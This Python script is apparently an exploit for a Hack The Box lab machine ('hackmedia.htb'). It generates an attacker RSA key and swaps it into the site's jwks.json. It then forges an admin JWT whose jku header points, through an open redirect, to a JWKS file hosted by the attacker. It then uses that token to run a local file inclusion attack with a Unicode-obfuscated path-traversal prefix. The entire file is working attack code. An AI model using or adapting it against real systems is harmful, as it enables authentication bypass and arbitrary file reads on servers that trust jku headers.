import jwt
import json
from Crypto.PublicKey import RSA
import requests as r
from jwcrypto import jwk
import argparse
import re
import netifaces as ni
# from os import getcwd

host = 'http://hackmedia.htb' # **IMPORTANT** add "10.10.11.126 hackmedia.htb" in "/etc/hosts" file.
files_path = '.'  # getcwd()
ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
jwks_serv_ip = ip


class GenTokenAndJWKS:
    def __init__(self):
        # Generate RSA key
        key = RSA.generate(2048)
        private_key = key.exportKey('PEM')
        public_key = key.publickey().exportKey('PEM')
        # Extract "n" and "e" value
        key = jwk.JWK.from_pem(public_key)
        jwks = key.export_public()
        # print(json.loads(jwks))

        # Generate modified "jwks.json" file
        org_jwks = r.get(f'{host}/static/jwks.json').text
        # print(org_jwks)
        json_object = json.loads(org_jwks)
        json_object['keys'][0]['n'] = json.loads(jwks)['n']
        json_object['keys'][0]['e'] = json.loads(jwks)['e']
        # print(json.dumps(json_object, indent=4))
        self.modified_jwks = json_object

        # Using Open redirect to bypass jku validation
        jwks_server = f"{host}/static/../redirect/?url={jwks_serv_ip}/jwks.json"
        # Generate jwt token
        self.jwt_token = jwt.encode({"user": "admin"}, private_key, algorithm="RS256", headers={"jku": jwks_server})
        # print(self.jwt_token)
        # decoded = jwt.decode(jwt_token, public_key, algorithms=["RS256"])
        # print(decoded)


parser = argparse.ArgumentParser()
parser.add_argument('--genFiles', action='store_true', help="Generate jwks.json and token.")
parser.add_argument('--lfi', help="lfi attack.")
args = parser.parse_args()


def getValues():
    return GenTokenAndJWKS()


def GenRequiredFiles():
    values = getValues()
    # write modified jwks in "jwks.json"
    print(f"[+] 'jwks.json' and 'jwt.token' will be saved in[CWD]: {files_path}")
    a_file = open(f"{files_path}/jwks.json", "w")
    json.dump(values.modified_jwks, a_file, indent=4)
    a_file.close()

    # Write jwt token in a file
    a_file = open(f"{files_path}/jwk.token", "w")
    a_file.write(values.jwt_token)
    a_file.close()


if args.genFiles:
    GenRequiredFiles()

try:
    jwt_token = open(f"{files_path}/jwk.token", "r").read()
    cookies_dict = {"auth": jwt_token}
    if args.genFiles:
        # Test token
        input(f"[+] Run 'sudo python3 -m http.server 80' on CWD before continue[ENTER]...")
        rspn = r.get(f"{host}/dashboard/", cookies=cookies_dict, allow_redirects=False)
        print(f"[!] Token take us to: {re.findall(r'<title>(.*?)</title>', rspn.text)[0]}")
except FileNotFoundError as e:
    print(e)


def lfi(payload):
    lfi_rspn = r.get(f"{host}/display/?page={payload}", cookies=cookies_dict)
    if 'Unauthorized' in lfi_rspn.text:
        exit('Unauthorized')
    elif re.search(r'<h3>(.*?)</h3>', lfi_rspn.text):
        print(f"[-] {re.findall(r'<h3>(.*?)</h3>', lfi_rspn.text)[0]}!")
    elif re.search(r'<title>(.*?)</title>', lfi_rspn.text):
        print(re.findall(r'<title>(.*?)</title>', lfi_rspn.text)[0])
    else:
        print(lfi_rspn.text)


if args.lfi:
    path = f"︰/︰/︰/︰/︰/︰{args.lfi}"
    lfi(path)
